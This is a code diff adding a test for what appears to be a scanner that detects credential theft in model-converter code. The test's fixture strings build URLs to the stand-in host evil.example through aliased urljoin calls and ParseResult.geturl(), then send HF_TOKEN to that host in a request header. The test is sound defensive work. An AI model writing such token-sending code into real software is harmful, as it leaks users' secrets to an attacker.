@@ -4118,6 +4118,45 @@ def test_a_url_object_that_is_rewritten_refuses_the_hub_allowance():
     ) == []
 
 
+def test_a_url_builder_under_an_alias_or_a_result_object_refuses_it():
+    """Two more spellings of the same rewrite.
+
+    `from urllib.parse import urljoin as j` leaves the call spelled j(...), and
+    comparing the call site against a set of names missed it exactly as the
+    decoder and docstring checks missed their own aliases, so imports are read
+    for what they bind. And a parse result assembles a whole destination out of
+    fields with no URL literal anywhere: ParseResult("https", "evil.example",
+    "/c", "", "", "").geturl() names no host the walk can see.
+
+    Upstream reads .scheme and .netloc off a parse result and never calls
+    geturl, and it imports nothing under an alias.
+    """
+    scan_converter_source = _load(
+        "converter_scan_alias_builder_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+
+    preamble = (
+        'import os\nimport requests\n'
+        'from urllib.parse import urljoin as j, ParseResult\n'
+        'import urllib.parse as up\n'
+        'HUB = "https://huggingface.co"\n'
+    )
+    send = 'requests.get(u, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+    for body in (
+        'u = j(HUB, "//evil.example/collect")\n' + send,
+        'u = up.urljoin(HUB, "//evil.example/c")\n' + send,
+        'u = ParseResult("https", "evil.example", "/c", "", "", "").geturl()\n'
+        + send,
+    ):
+        assert [f.check for f in scan_converter_source(preamble + body)], body
+
+    # Reading a parse result is what upstream does, twice, and it is not
+    # building one.
+    assert scan_converter_source(
+        preamble + 'u = f"{HUB}/api"\nassert up.urlparse(u).netloc\n' + send
+    ) == []
+
+
 def test_the_hub_narrowing_does_not_reach_any_other_rule():
     """Only the env-harvest combination is narrowed. A credential stealer or a
     remote-code loader that happens to mention the hub is untouched.
